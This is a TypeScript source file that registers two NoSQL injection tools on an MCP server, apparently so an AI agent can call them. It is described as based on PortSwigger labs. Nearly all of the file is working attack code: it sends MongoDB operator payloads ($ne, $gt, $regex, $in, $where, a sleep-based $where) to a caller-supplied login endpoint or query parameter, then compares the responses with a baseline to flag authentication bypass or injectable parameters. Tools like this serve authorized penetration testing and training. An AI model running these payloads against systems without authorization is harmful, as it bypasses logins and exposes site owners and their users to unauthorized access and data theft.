/**
 * NoSQL Injection testing tools.
 *
 * Tests MongoDB operator injection for auth bypass and data extraction.
 * Based on PortSwigger NoSQL Injection labs.
 */

import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import { runCmd, requireTool } from "../runner.js";

export function register(server: McpServer): void {
  server.tool(
    "nosqli_auth_bypass",
    "Test NoSQL operator injection ($ne, $gt, $regex) for authentication bypass. Sends payloads that abuse MongoDB query operators to bypass password checks. E.g., {\"username\":\"admin\",\"password\":{\"$ne\":\"\"}} matches any non-empty password. Returns: {results: [{payload_name, status, length, likely_bypass, snippet}]}. Side effects: Sends POST requests to the login endpoint. May create sessions.",
    {
      url: z
        .string()
        .describe(
          "Login endpoint URL, e.g. https://target/login or https://target/api/auth"
        ),
      username_param: z
        .string()
        .describe("JSON field name for username, e.g. 'username' or 'email'")
        .default("username"),
      password_param: z
        .string()
        .describe("JSON field name for password")
        .default("password"),
      target_username: z
        .string()
        .describe("Username to bypass auth for, e.g. 'admin'")
        .default("admin"),
    },
    async ({ url, username_param, password_param, target_username }) => {
      requireTool("curl");

      const payloads: [string, Record<string, unknown>][] = [
        [
          "$ne_empty",
          { [username_param]: target_username, [password_param]: { $ne: "" } },
        ],
        [
          "$ne_null",
          {
            [username_param]: target_username,
            [password_param]: { $ne: null },
          },
        ],
        [
          "$gt_empty",
          { [username_param]: target_username, [password_param]: { $gt: "" } },
        ],
        [
          "$regex_any",
          {
            [username_param]: target_username,
            [password_param]: { $regex: ".*" },
          },
        ],
        [
          "$exists_true",
          {
            [username_param]: target_username,
            [password_param]: { $exists: true },
          },
        ],
        [
          "both_$ne",
          {
            [username_param]: { $ne: "" },
            [password_param]: { $ne: "" },
          },
        ],
        [
          "$in_array",
          {
            [username_param]: target_username,
            [password_param]: { $in: ["", "password", "admin", "123456"] },
          },
        ],
        [
          "$nin_empty",
          {
            [username_param]: target_username,
            [password_param]: { $nin: [] },
          },
        ],
      ];

      // Baseline: legitimate failed login
      const baselineBody = JSON.stringify({
        [username_param]: target_username,
        [password_param]: "definitely_wrong_xyz789",
      });
      const baselineRes = await runCmd("curl", [
        "-sk",
        "-o",
        "-",
        "-w",
        "\n__META__%{http_code}:%{size_download}:%{redirect_url}",
        "-X",
        "POST",
        "-H",
        "Content-Type: application/json",
        "-d",
        baselineBody,
        url,
      ]);

      let blBody = baselineRes.stdout;
      const blMetaMarker = blBody.lastIndexOf("__META__");
      let blStatus = 0;
      let blLength = 0;
      if (blMetaMarker !== -1) {
        const meta = blBody.slice(blMetaMarker + 8).trim();
        const parts = meta.split(":");
        blStatus = parts.length > 0 ? parseInt(parts[0], 10) || 0 : 0;
        blLength = parts.length > 1 ? parseInt(parts[1], 10) || 0 : 0;
      }

      const results: Array<{
        payload_name: string;
        payload: string;
        status: number;
        length: number;
        redirect: string;
        likely_bypass: boolean;
        response_snippet: string;
      }> = [];

      for (const [payloadName, payloadBody] of payloads) {
        const data = JSON.stringify(payloadBody);
        const res = await runCmd("curl", [
          "-sk",
          "-o",
          "-",
          "-w",
          "\n__META__%{http_code}:%{size_download}:%{redirect_url}",
          "-X",
          "POST",
          "-H",
          "Content-Type: application/json",
          "-d",
          data,
          url,
        ]);

        let body = res.stdout;
        const metaMarker = body.lastIndexOf("__META__");
        let status = 0;
        let length = 0;
        let redirect = "";
        if (metaMarker !== -1) {
          const meta = body.slice(metaMarker + 8).trim();
          const parts = meta.split(":");
          status = parts.length > 0 ? parseInt(parts[0], 10) || 0 : 0;
          length = parts.length > 1 ? parseInt(parts[1], 10) || 0 : 0;
          redirect = parts.length > 2 ? parts[2] : "";
          body = body.slice(0, metaMarker);
        }

        const likelyBypass =
          (status !== blStatus && [200, 302, 303].includes(status)) ||
          (Math.abs(length - blLength) > 50 && status === 200) ||
          Boolean(
            redirect &&
              (redirect.toLowerCase().includes("dashboard") ||
                redirect.toLowerCase().includes("account"))
          );

        results.push({
          payload_name: payloadName,
          payload: data,
          status,
          length,
          redirect,
          likely_bypass: likelyBypass,
          response_snippet: body.slice(0, 500),
        });
      }

      const bypasses = results.filter((r) => r.likely_bypass);
      const result = {
        baseline: { status: blStatus, length: blLength },
        results,
        bypass_payloads: bypasses.map((r) => r.payload_name),
        hint:
          bypasses.length > 0
            ? `NoSQL auth bypass detected with: ${JSON.stringify(bypasses.map((r) => r.payload_name))}`
            : "No auth bypass detected. Server may not use MongoDB or properly sanitizes operators.",
      };

      return { content: [{ type: "text", text: JSON.stringify(result, null, 2) }] };
    }
  );

  server.tool(
    "nosqli_detect",
    "Test NoSQL injection detection in query parameters. Tests MongoDB operator injection ($ne, $gt, $regex, $where) in GET parameters and JSON body to detect NoSQL injection points. Returns: {baseline, results: [{payload_name, status, length, different}], injectable}. Side effects: Read-only. Sends ~10 requests.",
    {
      url: z
        .string()
        .describe(
          "URL with query parameter to test, e.g. https://target/api/products?category=Gifts"
        ),
      parameter: z
        .string()
        .describe("Parameter name to test for NoSQL injection"),
      method: z
        .enum(["GET", "POST"])
        .describe("HTTP method")
        .default("GET"),
      content_type: z
        .enum(["query", "json"])
        .describe("'query' for URL params, 'json' for JSON body")
        .default("query"),
    },
    async ({ url, parameter, method: _method, content_type }) => {
      requireTool("curl");

      const baseUrl = url.split("?")[0];

      // Get baseline
      let baselineRes;
      if (content_type === "query") {
        baselineRes = await runCmd("curl", [
          "-sk",
          "-o",
          "/dev/null",
          "-w",
          "%{http_code}:%{size_download}",
          url,
        ]);
      } else {
        baselineRes = await runCmd("curl", [
          "-sk",
          "-o",
          "/dev/null",
          "-w",
          "%{http_code}:%{size_download}",
          "-X",
          "POST",
          "-H",
          "Content-Type: application/json",
          "-d",
          JSON.stringify({ [parameter]: "test" }),
          baseUrl,
        ]);
      }

      const bp = baselineRes.stdout.split(":");
      const blStatus = bp.length > 0 ? parseInt(bp[0], 10) || 0 : 0;
      const blLength = bp.length > 1 ? parseInt(bp[1], 10) || 0 : 0;

      let testPayloads: [string, string][];
      if (content_type === "query") {
        testPayloads = [
          ["$ne_null", `${parameter}[$ne]=null`],
          ["$ne_empty", `${parameter}[$ne]=`],
          ["$gt_empty", `${parameter}[$gt]=`],
          ["$regex_all", `${parameter}[$regex]=.*`],
          ["$exists_true", `${parameter}[$exists]=true`],
          ["$where_true", `$where=1`],
          ["$where_sleep", `$where=sleep(100)`],
          ["regex_injection", `${parameter}='+{$regex:+'.'}'`],
          ["json_in_query", `${parameter}={"$ne":null}`],
        ];
      } else {
        testPayloads = [
          ["$ne_null", JSON.stringify({ [parameter]: { $ne: null } })],
          ["$ne_empty", JSON.stringify({ [parameter]: { $ne: "" } })],
          ["$gt_empty", JSON.stringify({ [parameter]: { $gt: "" } })],
          ["$regex_all", JSON.stringify({ [parameter]: { $regex: ".*" } })],
          [
            "$exists_true",
            JSON.stringify({ [parameter]: { $exists: true } }),
          ],
          ["$where_true", JSON.stringify({ $where: "1" })],
          [
            "$or_bypass",
            JSON.stringify({
              $or: [
                { [parameter]: { $ne: "" } },
                { [parameter]: { $exists: true } },
              ],
            }),
          ],
        ];
      }

      const results: Array<{
        payload_name: string;
        payload: string;
        status: number;
        length: number;
        different_from_baseline: boolean;
      }> = [];

      for (const [payloadName, payload] of testPayloads) {
        let curlArgs: string[];
        if (content_type === "query") {
          curlArgs = [
            "-sk",
            "-o",
            "/dev/null",
            "-w",
            "%{http_code}:%{size_download}",
            `${baseUrl}?${payload}`,
          ];
        } else {
          curlArgs = [
            "-sk",
            "-o",
            "/dev/null",
            "-w",
            "%{http_code}:%{size_download}",
            "-X",
            "POST",
            "-H",
            "Content-Type: application/json",
            "-d",
            payload,
            baseUrl,
          ];
        }

        const res = await runCmd("curl", curlArgs);
        const parts = res.stdout.split(":");
        const status = parts.length > 0 ? parseInt(parts[0], 10) || 0 : 0;
        const length = parts.length > 1 ? parseInt(parts[1], 10) || 0 : 0;

        const different =
          status !== blStatus || Math.abs(length - blLength) > 50;

        results.push({
          payload_name: payloadName,
          payload: payload.slice(0, 200),
          status,
          length,
          different_from_baseline: different,
        });
      }

      const injectablePayloads = results.filter(
        (r) => r.different_from_baseline
      );
      const result = {
        baseline: { status: blStatus, length: blLength },
        results,
        injectable_payloads: injectablePayloads.map((r) => r.payload_name),
        injectable: injectablePayloads.length > 0,
        hint:
          injectablePayloads.length > 0
            ? `NoSQL injection likely! ${injectablePayloads.length} payload(s) produced different responses.`
            : "No injection indicators. Parameter appears properly sanitized.",
      };

      return { content: [{ type: "text", text: JSON.stringify(result, null, 2) }] };
    }
  );
}
